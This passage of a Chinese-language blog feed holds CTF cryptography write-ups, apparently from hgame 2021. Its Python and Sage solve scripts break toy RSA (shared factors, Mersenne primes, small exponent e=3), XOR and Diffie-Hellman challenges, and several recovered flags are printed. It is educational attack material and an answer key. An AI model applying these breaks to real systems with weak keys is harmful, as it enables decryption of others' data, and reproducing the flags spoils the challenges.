= <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c1=<span class="number">5024836662627906750454817701922271080214720765897113783786369197810770999608528443597447448508876214100063962982376037712548944474807897847869334582773452689962992522987755069402952836848501053684233233850594080254869</span></span><br><span class="line">n1= <span class="number">10603199174122839808738169357706062732533966731323858892743816728206914395320609331466257631096646511986506501272036007668358071304364156150345138983648630874220488837685118753574424686204595981514561343227316297317899</span></span><br><span class="line"></span><br><span class="line">c2= <span class="number">130884437483098301339042672379318680582507704056215246672305503902799253294397268030727540524911640778691710963573363763216872030631281953772411963153320471648783848323158455504315739311667392161460121273259241311534</span></span><br><span class="line">n2= <span class="number">5613358668671613665566510382994441407219432062998832523305840186970780370368271618683122274081615792349154210168307159475914213081021759597948038689876676892007399580995868266543309872185843728429426430822156211839073</span></span><br><span class="line"></span><br><span class="line">c3=<span class="number">40136988332296795741662524458025734893351353026652568277369126873536130787573840288544348201399567767278683800132245661707440297299339161485942455489387697524794283615358478900857853907316854396647838513117062760230880</span></span><br><span class="line">n3= <span class="number">43197226819995414250880489055413585390503681019180594772781599842207471693041753129885439403306011423063922105541557658194092177558145184151460920732675652134876335722840331008185551706229533179802997366680787866083523</span></span><br><span class="line"></span><br><span class="line">n=[n1,n2,n3]</span><br><span class="line">c=[c1,c2,c3]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">if</span>(i!=j):</span><br><span class="line">            <span class="keyword">if</span>(gmpy2.gcd(n[i],n[j])!=<span class="number">1</span>):   <span class="comment">#对不同的n进行 欧几里得算法，以求出最大公约数(p)</span></span><br><span class="line">                print(i,j)                 <span class="comment">#输出对应的n的序号</span></span><br><span class="line">                p = gmpy2.gcd(n[i],n[j])</span><br><span class="line">                print(<span class="string">&quot;p = &quot;</span>,p)</span><br><span class="line">                q = n[i] // p</span><br><span class="line">                print(<span class="string">&quot;q = &quot;</span>,q)</span><br><span class="line">                d = gmpy2.invert(e , (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">                print(<span class="string">&quot;d = &quot;</span>,d)</span><br><span class="line">                m = <span class="built_in">pow</span>(c[i],d,n[i])</span><br><span class="line">                print(<span class="string">&quot;m = &quot;</span>,m)</span><br></pre></td></tr></table></figure><h2 id="22-XOR-Is-Friend-Not-Food"><a href="#22-XOR-Is-Friend-Not-Food" class="headerlink" title="22.XOR Is Friend Not Food"></a>22.XOR Is Friend Not Food</h2><p>给了提示。逐个异或发现，会出现重复，重复部分为  jowls</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;\t\x1b\x11\x00\x16\x0b\x1d\x19\x17\x0b\x05\x1d(\x05\x005\x1b\x1f\t,\r\x00\x18\x1c\x0e&quot;</span></span><br><span class="line">key=<span class="string">&#x27;jowls&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[i])^<span class="built_in">ord</span>(key[i%<span class="number">5</span>]))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="23-Tone-dialing"><a href="#23-Tone-dialing" class="headerlink" title="23.Tone dialing"></a>23.Tone dialing</h2><p><a href="http://dialabc.com/sound/detect/index.html">解密</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;67 84 70 108 101 97 110 123 67 82 89 80 84 79 71 82 65 80 72 89 125&#x27;</span></span><br><span class="line">s = s.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(ch))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="24-Defying-Hell"><a href="#24-Defying-Hell" class="headerlink" title="24.Defying Hell"></a>24.Defying Hell</h2><p>考察DH在乘法群下，求a，b</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p=<span class="comment">#</span></span><br><span class="line">g=<span class="comment">#</span></span><br><span class="line">A=<span class="comment">#</span></span><br><span class="line">B=<span class="comment">#</span></span><br><span class="line">a=discrete_log(mod(A,p),mod(g,p))</span><br><span class="line">print(long_to_bytes(a))b=discrete_log(mod(B,p),mod(g,p))</span><br><span class="line">print(long_to_bytes(b))</span><br></pre></td></tr></table></figure><p>ing——–</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;-&lt;/p&gt;
&lt;h2 id=&quot;1-Character-Encoding&quot;&gt;&lt;a href=&quot;#1-Character-Encoding&quot; class=&quot;headerlink&quot; title=&quot;1.Character Encoding&quot;&gt;&lt;/a&gt;1.Character Encod</summary>
      
    
    
    
    
    <category term="writeups" scheme="http://example.com/tags/writeups/"/>
    
  </entry>
  
  <entry>
    <title>2021-hgame-week3-Crypto</title>
    <link href="http://example.com/2021/02/17/2021-hgame-week3-Crypto/"/>
    <id>http://example.com/2021/02/17/2021-hgame-week3-Crypto/</id>
    <published>2021-02-16T18:50:39.000Z</published>
    <updated>2021-02-23T21:49:02.579Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-LikiPrime"><a href="#1-LikiPrime" class="headerlink" title="1.LikiPrime"></a>1.LikiPrime</h1><h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>Wow! RSA!</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/MgAPWkFy00oiQ4Hq.py?attname=task%20(14).py&download">附件</a></p><p>基准分数 250</p><p>当前分数 250</p><p>完成人数 97</p></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secrets, flag</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">secret</span>):</span></span><br><span class="line">    prime = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(secret):</span><br><span class="line">        prime = prime &lt;&lt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> prime - <span class="number">1</span></span><br><span class="line">random.shuffle(secrets)</span><br><span class="line">m = s2n(flag)</span><br><span class="line">p = get_prime(secrets[<span class="number">0</span>])</span><br><span class="line">q = get_prime(secrets[<span class="number">1</span>])</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">print(<span class="string">&quot;n = &#123;&#125;.format(n)&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;e = &#123;&#125;.format(e)&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;c = &#123;&#125;.format(c)&quot;</span>)</span><br></pre></td></tr></table></figure><p>考点时<a href="https://baike.baidu.com/item/%E6%A2%85%E6%A3%AE%E7%B4%A0%E6%95%B0/816141?fr=aladdin">梅森素数</a>，形如<br>$$<br>2^{p}-1<br>$$<br>且p也为素数。这种素数极少，求出来的一般已经有的了。没有也不会让你来求了。。可以直接<a href="http://www.factordb.com/">在线分解</a>网站分解，也可以用sagemath自带的这个库，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">n = <span class="comment"># ...</span></span><br><span class="line"><span class="comment"># OEIS A000668 = Mersenne primes</span></span><br><span class="line">p, q = [p <span class="keyword">for</span> p <span class="keyword">in</span> sloane.A000668.<span class="built_in">list</span>(<span class="number">20</span>) <span class="keyword">if</span> n % p == <span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span>(p * q == n)</span><br></pre></td></tr></table></figure><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>教科书般的rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">85112171004548202699682247376921706310822170049506449596605272489094694769078169913536427444643923348059539685553303357068402959283732410336346786908495499835455272404598114976799751040675620090248724961755725196624736968981232907594797717674594911297025654571721076444705959941925994025587881876326124684071661759258487833509454013092230162600534437805049532976203391767621841253309155061490353976765779898103673260263284277046138106569129696359367461119410993346551086662559997234143880233707716984096158549536573345903204185471058891136629579411644600395014869324129763707721173442829417413747507906735115228072507436216848673239496769027865595311123534258218327216715156438164479086950973463760620414715166392392777823585719038933373216457664076776843311637210993857185534139160353831173240699391129449108895834003176257066851958404866252203977379245430622352781119454582690804291160749904937894023460130968917894232899713180238015952172207584948174490451766895713944377918583954162721720466330852123633189465141000750081774205629876710045199951328212405550495246751373871098151362385328589640358863246783076592542887496148788920100777571297664667280763046532115437098944418687294437211354847941011359810140895347736223247211269643004729324700608874574142088947771613140548426336361582494328933812792741938310810523864937711376836606504465147360485148597824173024797435461622518690452934528003646960161829938826295154889065542657547945750758111443390620367280139978229809991197391367271715640324247659295826733787517206928656447820295772835111179883408526557033176732913949037161555149260288126039296438306504066336673180657526025306569724504415572475120854128582407090655030686144149718875411103253788742204651998897784244213809851559940940922552774377570524418568606357490618794388734819816305957196807958279719939070837736223824436117617987784271077215426555381991904234442752175115018168609700231943658738158076672038614915004964935308202506539498450284707841</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">41828375957739916498562150033564089454607196685766541904260442111783779478003448881259851883917398226540491650790249974421433348761375420108087265365193441492024115591798281856211977623935841068707373606889975928469672361155180696958446747582303558505125525894172119462482748979179830415546690209895297586474126493598388929684833183134920353452112907198987167061098105044585807909170318967985029708406368697882436907554186979496578957639256206911189597305995766587303709636306640121243903116040005748975753810297900468282648353586372642493059445871964866880645449509031978019248839162935862835671212013942704573002667939176802097078446598228772271369057295592787389462370014353770099550136228859019199207456799498624609744443698520048775644433751112687189109828495153292638846918857866742186082632577615433638021957543480478601160384514042824863570470747168897533974487644284002353757991697097440541955604548273991455473473583441384020183547411842316568259810449435971132789383567997756581282411640148168583403411330278018826030092211967714115240196437230950122107726585257279723416798611599463449846891498358395095842305874920144300736079357052293442346036158600085141381769599195261604426403696002482660528702857432296311235916585074292227300989073775307113303590124000104989109240479552142207801941909719645227158381950197555601169308615599358660843205797023594971224801284440306219210376704987982475852756344482789213083422700344902866535047924642856392177524993058087320034253403403557381022747823176548322366626926712919607581463322878496871139928676245688578522697322271922901015545622027094702988536460050644743949752209439959259611409789014912900588129762531009273094258687802315756884583244878375932387830607995009020890397586665018337786924178871951091331865101831840990852941098394527701627331124692989708727714533649142602383695932532211578954033263670584019073734148101005669725865690669230598790955898311435368130864855761372314375508267981050947387253</span></span><br><span class="line">p=<span class="number">2</span>**<span class="number">2281</span>-<span class="number">1</span></span><br><span class="line">q=<span class="number">2</span>**<span class="number">4253</span>-<span class="number">1</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag"></a>Getflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#39;hgame&#123;Mers3nne~Pr!Me^re4l1y_s0+5O-li7tle!&#125;&#39;</span><br></pre></td></tr></table></figure><h1 id="2-EncryptedChats"><a href="#2-EncryptedChats" class="headerlink" title="2.EncryptedChats"></a>2.EncryptedChats</h1><h2 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>Switch 的病友 Million 来监狱探监…</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/IyPmnO6oygq74kDv.zip?attname=task_modified_06a4ff4f607bf0acb7c7bbce9f69614e.zip&download">附件</a></p><p>基准分数 300</p><p>当前分数 300</p><p>完成人数 21</p></blockquote><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>给了A,B,g,p</p><p>DH(DIFFIE-HELLMAN)问题，这是个公钥交换协议，由离散对数问题而诞生。一开始没审好题，没看到是加法群下的DH问题，以为是乘法群下的，用ph爆破了一天。晚上看到是加法群下的DH，那就求逆乘对方公开key再取模即为 密钥(shared secret).然后就是AES CBC解密罢了简单，就不说</p><h3 id="推导"><a href="#推导" class="headerlink" title="推导"></a>推导</h3><p>$$<br>A\equiv (g*a)modp<br>$$</p><p>$$<br>a\equiv(g^{-1}*A)modp<br>$$</p><p>$$<br>share=(a*B)modp<br>$$</p><h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#dh_decrypt</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_pkcs7_padded</span>(<span class="params">message</span>):</span></span><br><span class="line">    padding = message[-message[-<span class="number">1</span>]:]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(padding[i] == <span class="built_in">len</span>(padding) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padding)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_flag</span>(<span class="params">shared_secret: <span class="built_in">int</span>, iv: <span class="built_in">str</span>, ciphertext: <span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="comment"># Derive AES key from shared secret</span></span><br><span class="line">    sha1 = hashlib.sha1()</span><br><span class="line">    sha1.update(<span class="built_in">str</span>(shared_secret).encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    key = sha1.digest()[:<span class="number">16</span>]</span><br><span class="line">    print(key.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="comment"># Decrypt flag</span></span><br><span class="line">    ciphertext = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line">    iv = <span class="built_in">bytes</span>.fromhex(iv)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_pkcs7_padded(plaintext):</span><br><span class="line">        <span class="keyword">return</span> unpad(plaintext, <span class="number">16</span>).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> plaintext.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> dh_decrypt</span><br><span class="line"><span class="comment"># p=remote(&#x27;socket.cryptohack.org&#x27;,13373)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line">p=<span class="comment">#</span></span><br><span class="line">A=<span class="comment">#</span></span><br><span class="line">g=<span class="comment">#</span></span><br><span class="line">B=<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">d=invert(g,p)</span><br><span class="line">a=(A*d)%p</span><br><span class="line">share=(a*B)%p</span><br><span class="line">iv=<span class="string">&quot;d3811beb5cd2a4e1e778207ab541082b&quot;</span></span><br><span class="line">encrypted=<span class="string">&quot;059e9c216bcc14e5d6901bcf651bee361d9fe42f225bc0539935671926e6c092&quot;</span></span><br><span class="line">flag1= dh_decrypt.decrypt_flag(shared_secret=share,iv=iv,ciphertext=encrypted)</span><br><span class="line">iv=<span class="string">&quot;b4259ed79d050dabc7eab0c77590a6d0&quot;</span></span><br><span class="line">encrypted=<span class="string">&quot;af3fe410a6927cc227051f587a76132d668187e0de5ebf0608598a870a4bbc89&quot;</span></span><br><span class="line">flag2=dh_decrypt.decrypt_flag(shared_secret=share,iv=iv,ciphertext=encrypted)</span><br><span class="line">print(flag1+flag2)</span><br></pre></td></tr></table></figure><h3 id="Getflag-1"><a href="#Getflag-1" class="headerlink" title="Getflag"></a>Getflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;AdD!tiVe-Gr0up~DH_K3y+eXch@nge^4nd&#x3D;A3S&#125;</span><br></pre></td></tr></table></figure><h1 id="3-HappyNewYear"><a href="#3-HappyNewYear" class="headerlink" title="3.HappyNewYear!!"></a>3.HappyNewYear!!</h1><p><del>手速快又拿了一血</del></p><h2 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>Liki 的朋友们在新年的时候给她发送了新年祝福<br>好家伙，一看就是群发的，有几个朋友发送的内容还是相同的！</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/tiWn2OAoRiC5a9AC.zip?attname=happynewyear_task_1e883107c8b6f99f7c0199872ba958a1%20(1).zip&download">附件</a></p><p>基准分数 300</p><p>当前分数 300</p><p>完成人数 56</p></blockquote><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>e=3，m相同。</p><p>$$<br>m^e≡c1(modn_1)\m^e≡c2(modn_2)\m^e≡c3(modn_3)<br>$$<br>给出了七组数据，。那就排列组合进行CRT</p><p>最后就是看结果刚好开立方是字符串。</p><h3 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">params=[[<span class="number">768731284506327944113406236027267453153178504481960474163849413572959901900781941471060120664615036667721568236486104212543941626093683611820051956888999990409535944068510533828285247642295156383062225121123397420863524500301605790432399020453905305067131509497931914214431033157498386840010234482484177898191608673445690542041959091445418878375877435164674203776931738708624804301646179653019817596612876848617302959482364008286148292002918372774353441375602500755004724814787928356594079344361596836482525021434616271982920662313256530007883018720585047232121289721656963132683682023625683229940587959315583539720857557451681402228168096559968476948263356605729649774017109848808425693506724312264272613164411551780892434255749213128692122454364559986018251379167331425321803760454026945039856860491038669974395683809854790365463840636343980962376205540013015629307389934488725537142983815565534720739509012176887290320329127809218230756596181528831774086891633290341399153631178022171655153576793324046302349267421556220063264261739968103953460444018066381487941305190730721608513048181450127628562770702172658088836581698332318905758721984778545449145728049393279394785952324627362503706190204128637631213405674863660425389313259</span>,<span class="number">722725267571877807402319081826628305252544883884335241258703688920929757984818470073041479840921480077113183869560758029121565524819466778712481183488277905449328223533043391590093655773827799575075615676500130199172201779452716348108026696828323022993975174610207567571651550333881731147356813019258889551558181283524226640533248278854011492561134943798149661873706769482776061146298693713915393175945083367889987571681776927122583376239974702806044792299381370488664195802017823240811394180509440609967345141141653389746431284893972530735438955464348280960825325776483554008537527538106398207335688261344254017151889931214151508915480961509920681364352778795068266724879364096996252272841617341643666522563974346452491302969822483901472736908002176995244808285202644542949151920310938882432565101197174787422479197405599503943928375781580538374853471395003088467545128060029187794431891563377967647568991772201040537299188867383732391802781253804314567562657951501684710262276597091279719861829006628377575073875781088939946651128183090724290607438597560193321130496240482260573568646971658130695308585240404956802017929673317521572608385674052894773447205932790060730005333539795323555614705817665786476411351969424168366962370578</span> ], [<span class="number">524955549822701108820249448341549471789542970374297220719644144467046120999708435027269809717491708384591502747843811858599256578006152409861521624800414221049434790169883523654257416906811451131195855586244598374880878692418389200238536952258677438654818096236001665540878733993916070969439309600669058216532381285131220090854384696479702333190547690812990714884526122724065211294733252863353053612662498096532976972273019631446622835704720241172866721075241553118399444619649756067546482948914446034527197029043296867226467390140262361175465932673129685497666662167082114259368591713670044469780955810420060714389043507570707061129150071885165680539302629323340904857078380746639406842784054066196290404127562974351550470732956889057701068241533469665269708040337792974792839671609064624273734488264409908037327963582749939131119285299618565955038449080047185142908091099286222071106259434530841587125509988124634728986309920606439740930811537598857558982632237868734857663853645411122621117175983417162818791869180350737709034243602399686004808133116046260847513863100560285962053110278579574895754928960943506584372424062481234806423574610837438057911596190771344568064718882123247708570545980147637910744997312960997877114875563</span>,<span class="number">341106636902364624537621803937059683829500847731737217024477947229102117868841270816391462580424161421481323287279560344771837711680149251407621544732737892160496443939357041950388493554496406007658435517211507967374859158779641371713073809459356957664870385022506283994639885012608754343497740963582877475346528865751238785898641641562644419639994889039921662499512792397994326679297072288344988329863729467521185656908541750681614296631331948235836697947639517519093825102735706418368162081693311580728579264440449951888361065347124447876814670051679652280281965491150266115964128635848848265679743499256971016535195477416889144131600175159747033626985115139696085153828051183257884668367446309997650590293659781294222777784435987334384194429993199873061206563903159227361936901013994702046575677089263288115905540761147293222721696340819505305497691052766999798297905368576684359681315851605714974267829409740228043899512270242579080482164570677517245195783188509338962785491871370414414487565392656794817257748899014632689366928706013426731920865802714147114118673053353872356444566840336431784793686607763099763915943769968162453433779091468653936247489610842351714130350853888962620401435016019892000066519489369586647822582532</span> ], [<span class="number">531816715051067911629200567254640608407895151120321915934223550416084055941810057275647124365372164691799815654324843152835621657219143971510794565282438719132189708357084269561390602533348667210778967547331570345307713271797500472800693615897738386357322760213782607288672639158771643480519455699144535885754570631972814751649211026584146963569748660071519399459076694805787216533150149579905553101555997182221446716574345192297201707280470099673168021522276021573255431147391095907444654303966368362618307277890450431646680417082866906543559655835992081835168319097576418799442472634041439781110915814527860626840035884588953837943723302497813966476632638781785524454419556109443369209786353302330932241171298568309190081206636347720214268688100661670856945137179076232753814259674913102806389336950363047338944420468292248719856587641014569194752277829684619803918722245724677129232358305719548783148527753735258295780607510739074337299037254055287750082818921964088131910307180760939784520021579399465657665634960365680711736311232219221704752502361047780644838828947578962833367751773943513294960723081845674700714114613905708967183234219078662548527491691822238226973730089750314606177285702898595711912716069746542235493085749</span>,<span class="number">96655501480984228476843527875038148766862682735216531181731365068856421448884071634422050543257015201836409006098564512948671369804995159104827331853700167554494548064655395947790619030027666553546707921275511050067552520015915189711919816240838635843727117678456359153157042256845391879627204005136329626204082446757707275024018932620919979573721462329490962992796317057293975350138690301006093906543825995442041881912668467639058815752449994459671712370905576936766284703593791336731603543492278087975208438906947966054673189424532474872122585340933934837935650393646216239318131268109344918651250925428018278665569580645117439459587437729735009669592816057201053074978283319149894796397333902672858475161613255814596817201545193202169499144055305358584644635503323032680354835638327999633796089419073741897835010300917603325122563734141907765815188906909017245236242853269976816696795439826925876239600449014662736919205840699787188466436497530759889271878272675511804209502453822900397006767975864334707665149166220819464748535531766670263050223009402082194467219438612279935716319300498861153496030333202808928006701019408354471055774090532330704743753190920815655232618981877529057446430825964256948001465214314349394508264556</span> ], [<span class="number">493772253520028701228394073791118796898860642546293517165976340880188671501170757992157937835809864375957661380376149183362237960714624594301301578885724183490678033704978135608268473206365825232902155458695063561942608980565675676060170247587203833300205781482210306978615656217675258493239504539762213919984146477146352995349444904282648001338541091894423167804984256356783623092953892148062097076194840351505254447228339051915162949343535017563167413299991340194548813782360554779507722510592683811398509607473468601404587617569337150824778600883884616204746234575349549906287741463102675096118386062231492163458668021511751022439191080507345540921839703382290445797046739813648289321292589201149955672085687445193343364105492343611293348540598587286909499000234416955201612299458282688515658596600656417554161895812046994316423241245289735327450704642000340929459813500971266436908790234452643087694195334024560701562917342963860276789458845939794177422833059051673483227332372905969868740556412782843128761060670334188293944421019131514119696008065850631880588123929581097844255625593530935229341774189341909782979667383762706038731196861300615117475933625813147094849135055190312732335084507955724604696171453417718094964090327</span>,<span class="number">357103586677133190400275535608298307096755517917743991779928165944808156555143364562652658318257441161780966754082431346703420213047464905801347987429587866507784835294289240703319363713980965945263022810877492245609589053923882000898807593180841308987573262209122953930711801088265031627560104571585260900206878593365521048031056818241791513449270437055503002833594299287048995560742435886215547766657105383700364572345248814440024509278757886084274494794572349604428103225636768278633773471700470592729438598821712944805975639637427494951822994991131521067141611563925956037672180261640035716517421681741527507431981163704929952037747170161617798150545493396732644456871805542270699764392127056902381387198947947443962667595072777104565429494042828509588406057498452896606672079600318076629291832964611485077778334984817595747726526804076306703817160053516530370696172218743746676413884784385108888108803420106818173901070897426014100110652172248635456173774009497111567782846079335233333617278837527467186444919584161474044529784043912893406555209016056689227249614906221138535989446685926185643604698806909451119908925728900998397084501277736148437741526619184826982588354997162924650747731826227150677994598866694976617038952960</span> ], [<span class="number">400814713999150053337202998177245797185153318108582661287579898596310746501291974666347785576673046001863500878959207830917744556274546158919815600936114953314600540036576429657582500764669413652252770861966417840099061248948771555745832102924038855172611675048290264202872791337710865213077945592130795851795718608065812757968780578674701063411377538597424177722558867587781141897676300153523209675996201871155481412772845570976807158049274849081684209479884845355028703657648486318475977716075670243766212910039942550957289189946628261360037565354423094972917371572096203537186108596979722712819213554550645058717286550110465343100499845761528635976859006285823914211739843983972560292482778326983903018873698437828016668821516581220588836782094261582899393704029819851484331592269664479855215056764839779582417486366182524483986373098489636334412671358130389579972838029202609936524996601129648191606117951616875200119129837212604760319073283133589692257497994855882819655018727368441361317788278857721179085847352853038553208639836433059097775135452611114351766229800268321281856140246610438246783364320786390657242414430601000831387967976691362673290089725234013924339500819390840062916754623424132621350706544122257464089409619</span>,<span 